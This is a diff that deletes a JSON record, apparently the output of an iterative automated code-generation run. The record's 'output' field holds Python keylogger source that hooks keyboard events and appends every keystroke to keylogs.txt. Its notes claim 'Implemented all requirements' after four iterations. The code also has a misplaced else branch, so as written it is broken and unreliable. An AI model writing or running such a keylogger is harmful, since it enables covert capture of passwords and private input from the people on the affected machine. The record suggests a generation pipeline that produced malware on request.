@@ -1,8 +1,0 @@
-{
-  "output": "import win32api\nimport win32con\nimport win32gui\nimport keyboard\n\nfile_path = \"keylogs.txt\"\n\ndef key_handler(event):\n    if event.event_type == keyboard.KEY_DOWN:\n        with open(file_path, \"a\") as f:\n            if len(event.name) > 1:\n                print(\"Special Key pressed: \" + str(event.name))\n                f.write(str(event.name) + \"\\n\")\n        else:\n            print(\"Key pressed: \" + event.name)\n            f.write(event.name + \"\\n\")\n\nkeyboard.on_press(key_handler)\n\nwhile 1:\n    pass",
-  "notes": "Implemented all requirements",
-  "applied_fixes": [
-    "iteration3_issue1"
-  ],
-  "iterations": 4
-}
